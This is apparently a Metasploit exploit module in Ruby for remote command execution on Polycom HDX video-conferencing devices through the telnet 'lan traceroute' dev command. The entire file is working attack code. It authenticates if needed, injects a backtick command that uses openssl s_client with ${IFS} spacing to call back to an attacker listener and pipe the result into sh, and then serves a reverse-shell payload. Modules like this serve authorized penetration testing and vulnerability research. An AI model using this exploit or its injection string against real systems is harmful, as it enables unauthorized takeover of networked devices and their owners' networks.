# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Polycom Shell HDX Series Traceroute Command Execution&#039;,
      &#039;Description&#039; => %q{
        Within Polycom command shell, a command execution flaw exists in
        lan traceroute, one of the dev commands, which allows for an
        attacker to execute arbitrary payloads with telnet or openssl.
      },
      &#039;Author&#039; => [
        &#039;Mumbai&#039;, #
        &#039;staaldraad&#039;, # https://twitter.com/_staaldraad/
        &#039;Paul Haas <Paul [dot] Haas [at] Security-Assessment.com>&#039;, # took some of the code from polycom_hdx_auth_bypass
        &#039;h00die <mike@shorebreaksecurity.com>&#039; # stole the code, creds to them
      ],
      &#039;References&#039; => [
        [&#039;URL&#039;, &#039;https://staaldraad.github.io/2017/11/12/polycom-hdx-rce/&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Nov 12 2017&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Stance&#039; => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039; => [[ &#039;Automatic&#039;, {} ]],
      &#039;Payload&#039; => {
        &#039;Space&#039; => 8000,
        &#039;DisableNops&#039; => true,
        &#039;Compat&#039; => { &#039;PayloadType&#039; => &#039;cmd&#039;, &#039;RequiredCmd&#039; => &#039;telnet generic openssl&#039;}
      },
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039; },
      &#039;DefaultTarget&#039; => 0
    ))

    register_options(
    [
      Opt::RHOST(),
      Opt::RPORT(23),
      OptString.new(&#039;PASSWORD&#039;, [ false, "Password to access console interface if required."]),
      OptAddress.new(&#039;CBHOST&#039;, [ false, "The listener address used for staging the final payload" ]),
      OptPort.new(&#039;CBPORT&#039;, [ false, "The listener port used for staging the final payload" ])
    ])
  end

  def check
    connect
    Rex.sleep(1)
    res = sock.get_once
    disconnect
    if !res && !res.empty?
      return Exploit::CheckCode::Unknown
    elsif res =~ /Welcome to ViewStation/ || res =~ /Polycom/
      return Exploit::CheckCode::Detected
    end
    Exploit::CheckCode::Unknown
  end

  def exploit
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to connect to target service")
    end

    #
    # Obtain banner information
    #
    sock = connect
    Rex.sleep(2)
    banner = sock.get_once
    vprint_status("Received #{banner.length} bytes from service")
    vprint_line("#{banner}")
    if banner =~ /password/i
      print_status("Authentication enabled on device, authenticating with target...")
      if datastore[&#039;PASSWORD&#039;].nil?
        print_error("#{peer} - Please supply a password to authenticate with")
        return
      end
      # couldnt find where to enable auth in web interface or telnet...but according to other module it exists..here in case.
      sock.put("#{datastore[&#039;PASSWORD&#039;]}\n")
      res = sock.get_once
      if res =~ /Polycom/
        print_good("#{peer} - Authenticated successfully with target.")
      elsif res =~ /failed/
        print_error("#{peer} - Invalid credentials for target.")
        return
      end
    elsif banner =~ /Polycom/ # praise jesus
      print_good("#{peer} - Device has no authentication, excellent!")
    end
    do_payload(sock)
  end

  def do_payload(sock)
    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
    cbhost = datastore[&#039;CBHOST&#039;] || datastore[&#039;LHOST&#039;] || Rex::Socket.source_address(datastore[&#039;RHOST&#039;])

    # Start a listener
    start_listener(true)

    # Figure out the port we picked
    cbport = self.service.getsockname[2]
    cmd = "devcmds\nlan traceroute `openssl${IFS}s_client${IFS}-quiet${IFS}-host${IFS}#{cbhost}${IFS}-port${IFS}#{cbport}|sh`\n"
    sock.put(cmd)
    if datastore[&#039;VERBOSE&#039;]
      Rex.sleep(2)
      resp = sock.get_once
      vprint_status("Received #{resp.length} bytes in response")
      vprint_line(resp)
    end

    # Give time for our command to be queued and executed
    1.upto(5) do
      Rex.sleep(1)
      break if session_created?
    end
  end

  def stage_final_payload(cli)
    print_good("Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...")
    cli.put(payload.encoded + "\n")
  end

  def start_listener(ssl = false)
    comm = datastore[&#039;ListenerComm&#039;]
    if comm == &#039;local&#039;
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    self.service = Rex::Socket::TcpServer.create(
      &#039;LocalPort&#039; => datastore[&#039;CBPORT&#039;],
      &#039;SSL&#039;       => ssl,
      &#039;SSLCert&#039;   => datastore[&#039;SSLCert&#039;],
      &#039;Comm&#039;      => comm,
      &#039;Context&#039;   =>
      {
        &#039;Msf&#039;        => framework,
        &#039;MsfExploit&#039; => self
      }
    )

    self.service.on_client_connect_proc = proc { |client|
      stage_final_payload(client)
    }

    # Start the listening service
    self.service.start
  end

  # Shut down any running services
  def cleanup
    super
    if self.service
      print_status("Shutting down payload stager listener...")
      begin
        self.service.deref if self.service.is_a?(Rex::Service)
        if self.service.is_a?(Rex::Socket)
          self.service.close
          self.service.stop
        end
        self.service = nil
      rescue ::Exception
      end
    end
  end

  # Accessor for our TCP payload stager
  attr_accessor :service
end

